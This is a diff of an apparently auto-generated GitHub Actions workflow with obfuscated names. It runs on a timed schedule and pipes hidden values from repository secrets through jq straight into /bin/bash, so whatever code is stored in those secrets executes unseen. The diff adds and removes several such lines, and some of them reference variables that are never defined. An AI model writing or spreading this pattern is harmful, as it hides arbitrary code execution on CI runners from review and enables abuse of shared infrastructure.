@@ -1,10 +1,9 @@
 name: yangxiaosan3728
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '14 4/6 * * *'
-jobs:  # 7855
+    - cron: '38 2/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,16 +11,10 @@ jobs:  # 7855
       - uses: actions/checkout@v4
       - name: yangxiaosan3728
         env:
-          wur5798: ${{ secrets.wur5798 }}
+          agyxw32: ${{ secrets.agyxw32 }}
         run: |
-          echo $wur5798 | jq -r .ylqlc20 | /bin/bash
-          echo $tit44 | jq -r .g2 | /bin/bash
-          echo $u26 | jq -r .hszq36111 | /bin/bash
-          echo $dsl373 | jq -r .qto3162 | /bin/bash
-          echo $d69 | jq -r .rj27451 | /bin/bash
-          echo $bhnqx8 | jq -r .lqfdf8 | /bin/bash
-          echo $l76622 | jq -r .yih168 | /bin/bash
-          echo $l382 | jq -r .rb83543 | /bin/bash
-          echo $axjm8 | jq -r .y47394 | /bin/bash
-          echo $sm5 | jq -r .md3178 | /bin/bash
+          echo $agyxw32 | jq -r .umre3 | /bin/bash
+          echo $clst4545 | jq -r .erbzv7 | /bin/bash
+          echo $zbcm03 | jq -r .md09 | /bin/bash
+          echo $h4197 | jq -r .tit07890 | /bin/bash
 
